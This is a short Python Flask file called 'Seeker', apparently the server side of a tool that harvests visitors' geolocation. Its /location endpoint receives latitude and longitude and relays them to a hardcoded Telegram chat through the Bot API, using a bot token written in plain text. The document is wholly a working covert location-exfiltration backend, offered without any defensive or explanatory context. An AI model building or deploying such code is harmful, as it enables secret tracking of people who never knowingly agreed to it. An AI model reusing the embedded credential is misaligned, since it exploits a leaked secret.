from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = "8180824287:AAGIK9u6Mym29gwvp7teIEXfVxkgzWUMYGs"
USER_ID = "93372553"

@app.route("/")
def index():
    return "Seeker is running!"

@app.route("/location", methods=["POST"])
def location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    message = f"📍 Location: {lat}, {lon}"
    
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}")
    return "Location sent!", 200